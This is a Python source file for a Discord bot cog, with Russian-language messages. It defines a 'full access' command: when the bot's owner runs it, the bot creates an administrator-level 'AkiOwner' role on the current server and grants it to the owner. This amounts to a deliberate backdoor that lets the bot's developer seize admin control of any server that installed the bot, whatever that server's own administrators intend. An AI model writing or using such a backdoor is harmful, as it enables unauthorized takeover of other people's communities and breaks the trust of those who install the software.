import discord

from discord.ext import commands

from core.bot import is_owner
from core.embeds import Errors, Helpers
from core.logger import logger
from data.colors import colors
from scripts.parsers.settings import settings

class FullAccess(commands.Cog):
    """Выдает владельцу бота полный доступ на текущем сервере"""

    def __init__(self, bot):
        self.bot = bot

    def full_access_help(self, prefix, emb: discord.Embed):
        return emb.add_field(name = f'{prefix}полный_доступ', value = 'Выдать полный доступ', inline = False)

    async def full_access_helper(self, ctx):
        emb = await Helpers.default_embed(self, ctx, self.bot.user.avatar_url, 'Полный доступ')
        emb.add_field(name = 'Использование', value = f'`{settings["prefix"]}доступ`\n┗ Выдаст вам полный доступ на текущем сервере.', inline = False)
        await ctx.send(embed = emb)
        logger.info(f'Выведена информация о "Полный доступ" — Запросил пользователь: {ctx.author} ({ctx.author.id}).')

    @commands.command(aliases = [
                                'full_access', 'fullaccess', 'access',
                                'полный_доступ', 'полныйдоступ', 'доступ', 'дать_доступ'
                                ])
    async def full_access_command(self, ctx):
        if is_owner(ctx.author.id) is True:
            owner_role = discord.utils.get(ctx.message.guild.roles, name = 'AkiOwner')
            if owner_role in ctx.author.roles:
                await Errors.custom_msg_embed(self, ctx, 'У вас уже имеется роль создателя')
                logger.warning(f'У пользователя уже имеется роль создателя — Запросил пользователь: {ctx.author} ({ctx.author.id}).')
                return
            if owner_role is None:
                owner_role = await ctx.guild.create_role(name = 'AkiOwner', permissions = discord.Permissions(administrator = True), color = colors['success'])
                logger.info(f'Создана роль владельца бота — Запросил пользователь: {ctx.author} ({ctx.author.id}).')
            await ctx.author.add_roles(owner_role, reason = None, atomic = True)
            logger.info(f'Выдана роль владельца бота — Запросил пользователь: {ctx.author} ({ctx.author.id}).')
        else:
            await Errors.no_permissions_embed(self, ctx)
            logger.warning(f'Попытка получить роль владельца бота — Запросил пользователь: {ctx.author} ({ctx.author.id}).')

def setup(bot):
    bot.add_cog(FullAccess(bot))